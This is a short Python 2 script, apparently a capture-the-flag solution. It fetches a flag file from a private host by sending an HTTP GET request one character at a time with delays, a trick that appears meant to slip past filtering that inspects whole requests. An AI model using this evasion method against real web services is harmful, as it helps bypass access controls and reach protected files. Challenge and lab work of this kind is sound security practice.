#!/usr/bin/env python2
import socket
import time

sock = socket.socket()
sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)
sock.connect(('172.31.2.97', 30485))

for c in 'GET /flag-4ae60838.txt HTTP/1.1\r\nHost: 172.31.2.97:30485\r\n\r\n':
    sock.send(c)
    print 'sent {}'.format(c),
    time.sleep(1)

while True:
    print sock.recv(1024),